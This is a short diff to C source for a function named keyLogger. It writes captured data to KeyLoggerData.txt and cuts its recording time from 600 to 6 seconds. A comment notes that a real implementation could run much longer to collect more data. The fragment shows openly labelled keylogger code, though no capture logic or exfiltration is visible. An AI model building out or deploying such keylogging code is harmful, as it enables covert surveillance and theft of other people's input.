@@ -6,7 +6,7 @@
 #include <unistd.h>
 #include <time.h> 
 
-public void keyLogger()
+int keyLogger()
 {
 FILE *f = fopen("KeyLoggerData.txt", "w");
    time_t begin, finish;
@@ -24,7 +24,7 @@ FILE *f = fopen("KeyLoggerData.txt", "w");
     
      finish = time(NULL);
      timer = difftime(finish, begin);
-     if (timer >= 600 ) {
+     if (timer >= 6 ) {//only tracks for six seconds in example, an actual implementaion could go much longer to track alot more data
        clockRunning = 0;
    }
 }
